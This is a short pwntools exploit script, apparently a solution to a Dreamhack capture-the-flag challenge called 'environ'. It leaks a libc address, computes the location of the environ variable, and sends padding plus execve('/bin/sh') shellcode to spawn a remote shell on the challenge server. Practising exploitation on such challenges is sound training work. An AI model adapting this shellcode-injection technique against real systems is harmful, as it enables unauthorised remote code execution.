#!/usr/bin/python3

from pwn import *

#p = process("./environ")
p = remote("host1.dreamhack.games", 13317)

#context.log_level = 'debug'
context.arch = 'x86_64'

shellcode = b"\x90"*50
shellcode += asm(shellcraft.execve("/bin/sh"))
size = len(shellcode)

padding = b"A"*0x118
size += len(padding)

p.recvuntil(": ")
stdout = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)
log.info("stdout: " + hex(stdout))

stdoutOffset = 0x00000000003c5620
libcBase = stdout - stdoutOffset
log.info("Library Base Address: " + hex(libcBase))

environOffset = 0x00000000003c6f38
environ = libcBase + environOffset
log.info("Environ: " + hex(environ))

payload = padding
payload += shellcode

p.sendlineafter("Size: ", str(size))
p.sendlineafter("Data: ", payload)
p.sendlineafter("*jmp=", str(environ))

p.interactive()

"""
environ in Address - buf = 0x118
"""
